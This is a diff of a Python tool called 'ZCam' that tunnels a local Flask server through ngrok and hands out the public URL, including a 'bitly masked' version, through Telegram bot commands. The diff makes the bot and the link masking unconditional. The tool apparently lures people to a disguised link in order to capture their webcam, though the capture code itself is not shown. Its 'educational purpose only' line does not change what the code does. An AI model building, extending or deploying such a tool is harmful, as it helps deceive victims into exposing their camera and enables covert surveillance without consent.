@@ -57,56 +57,43 @@ try:
     public_url = ngrok.connect(fport).public_url
     final_ngrok = public_url[:4] + "s" + public_url[4:]
 
-    # url shorten or not
-    shorten = input(f"{bcolors.WARNING} Do you want to use Bitly to shorten url link? ['y' or 'n']: {bcolors.ENDC}")
-    if shorten == 'y' or shorten == 'Y' or shorten == 'Yes' or shorten =='yes':
-        final_ngrok = s.bitly.short(final_ngrok)
-    else:
-        final_ngrok = final_ngrok
-
     # telegram bot building
-    tgbot = input(f"{bcolors.WARNING} Do you want telegram bot support? ['y' or 'n']: {bcolors.ENDC}")
-    if tgbot == 'y' or tgbot == 'Y' or tgbot == 'Yes' or tgbot =='yes':
+    @bot.message_handler(commands=["link"])
+    def send_link_and_image(msg):
+        bot.reply_to(msg, final_ngrok)
+        global user_id
+        user_id = msg.chat.id
 
-        @bot.message_handler(commands=["link"])
-        def send_link_and_image(msg):
-            bot.reply_to(msg, final_ngrok)
-            global user_id
-            user_id = msg.chat.id
+    @bot.message_handler(commands=["shorten_link"])
+    def send_shortend_link(msg):
+        s_final_ngrok = s.bitly.short(final_ngrok)
+        bot.reply_to(msg, s_final_ngrok)
+        global user_id
+        user_id = msg.chat.id
 
-        @bot.message_handler(commands=["shorten_link"])
-        def send_shortend_link(msg):
-            s_final_ngrok = s.bitly.short(final_ngrok)
-            bot.reply_to(msg, s_final_ngrok)
-            global user_id
-            user_id = msg.chat.id
+    @bot.message_handler(commands=["start"])
+    def send_start_message(msg):
+        bot.reply_to(msg,"Welcome.....ZCam tool is for Eductaional purpose only. Use /help for more info. Support @Team_ETF for more..... JOIN: https://youtube.com/channel/UCJnx0yDhcTLWM3ZrAtSvaIw")
+        global user_id
+        user_id = msg.chat.id
 
-        @bot.message_handler(commands=["start"])
-        def send_start_message(msg):
-            bot.reply_to(msg,"Welcome.....ZCam tool is for Eductaional purpose only. Use /help for more info. Support @Team_ETF for more..... JOIN: https://youtube.com/channel/UCJnx0yDhcTLWM3ZrAtSvaIw")
-            global user_id
-            user_id = msg.chat.id
+    @bot.message_handler(commands=["help"])
+    def send_help_message(msg):
+        bot.reply_to(msg,"Use /menu for menu window. Use /link to get ngrok link. Use /shorten_link to get bitly masked link.")
+        global user_id
+        user_id = msg.chat.id
 
-        @bot.message_handler(commands=["help"])
-        def send_help_message(msg):
-            bot.reply_to(msg,"Use /menu for menu window. Use /link to get ngrok link. Use /shorten_link to get bitly masked link.")
-            global user_id
-            user_id = msg.chat.id
-
-        @bot.message_handler(commands=["menu"])
-        def show_menu_page(msg):
-            markup = types.ReplyKeyboardMarkup(row_width=1)
-            btn1 = types.KeyboardButton("/start")
-            btn2 = types.KeyboardButton("/link")
-            btn3 = types.KeyboardButton("/shorten_link")
-            btn4 = types.KeyboardButton("/help")
-            markup.add(btn1,btn2,btn3,btn4)
-            bot.send_message(chat_id=msg.chat.id, text="Choose from menu", reply_markup=markup)
-            global user_id
-            user_id = msg.chat.id
-            
-    else:
-        pass
+    @bot.message_handler(commands=["menu"])
+    def show_menu_page(msg):
+        markup = types.ReplyKeyboardMarkup(row_width=1)
+        btn1 = types.KeyboardButton("/start")
+        btn2 = types.KeyboardButton("/link")
+        btn3 = types.KeyboardButton("/shorten_link")
+        btn4 = types.KeyboardButton("/help")
+        markup.add(btn1,btn2,btn3,btn4)
+        bot.send_message(chat_id=msg.chat.id, text="Choose from menu", reply_markup=markup)
+        global user_id
+        user_id = msg.chat.id
 
     
     #final ngrok link
@@ -174,7 +161,6 @@ try:
     # threading to run flask with pyngrok smoothly
     threading.Thread(target=app.run, kwargs={"use_reloader": False}).start()
     bot.polling()
-    
 
 except KeyboardInterrupt:
     print(f"{bcolors.FAIL} Ending task.....\n")
